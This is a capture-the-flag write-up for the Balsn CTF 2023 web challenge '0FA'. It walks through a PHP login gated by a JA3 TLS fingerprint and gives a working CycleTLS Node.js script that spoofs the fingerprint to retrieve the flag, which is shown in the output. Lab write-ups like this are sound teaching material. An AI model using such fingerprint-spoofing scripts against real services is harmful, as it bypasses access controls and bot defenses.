---
title: 0FA
date: 2023-10-09
tags:
  - web
author: cartouche70
---

# 0FA

Description: I really don't like 2FA, so I created a 0FA login system!

Challenge Author: kaibro

- we have a php application
- we can see that in index.php it s just a submit query input that can be vulnerable

```html
<form method="post" action="flag.php">
            <div class="field">
                <input type="text" class="input" name="username" placeholder="Username...">
            </div>
            <input type="submit" class="button is-primary"><br>
        </form>
```

it goes to the flag.php

```php
<?php
include_once("config.php");
fingerprint_check();
if(!isset($_POST['username']) || $_POST['username'] !== "admin")
    die("Login failed!");
?>
```

so, if the username is not admin, then login fails, but he also makes some fingerprint checks(). Maybe it’s exploitable, but let s try to put admin there first and see the request

we sent a request to the server and we can see that we still have an error, but the username is indeed admin, we can look somewhere else. 

in the config.php, there is a defined JA3 fingerprint and it checks if that fingerprint is the same as the one received by the server.

```php
<?php
define("FINGERPRINT", "771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0");
$flag = 'BALSN{fake_flag}';

function fingerprint_check() {
    if($_SERVER['HTTP_SSL_JA3'] !== FINGERPRINT) 
        die("Login Failed!"); 
}
```

After some research, we can see that the ja3 fingerprint can be impersonated.

For that, I used CycleTLS, an npm module good for ja3 impersonation.

```tsx
const qs = require('qs');

const initCycleTLS = require('cycletls');
// Typescript: import initCycleTLS from 'cycletls';

(async () => {
  // Initiate CycleTLS
  const cycleTLS = await initCycleTLS();
  const bodyDict = {username:"admin"};
  // Send request
  const response = await cycleTLS('https://0fa.balsnctf.com:8787/flag.php', {
    body: qs.stringify(bodyDict),
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    method: "POST",
    ja3: '771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0',
    userAgent: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0'
  }, 'post');

  console.log(response);

  // Cleanly exit CycleTLS
  cycleTLS.exit();

})();
```

after running this script, we have this output in console:

```tsx
{
  status: 200,
  body: '<html>\n' +
    '<head>\n' +
    '    <title>Balsn CTF 2023 - 0FA</title>\n' +
    '    <meta charset="UTF-8">\n' +
    '    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">\n' +
    '</head>\n' +
    '<body>\n' +
    '  Here is your flag: BALSN{Ez3z_Ja3__W4rmUp}</body>\n' +
    '</html>',
  headers: {
    Connection: 'keep-alive',
    'Content-Type': 'text/html; charset=UTF-8',
    Date: 'Mon, 09 Oct 2023 07:54:15 GMT',
    Server: 'nginx/1.23.1'
  }
}
```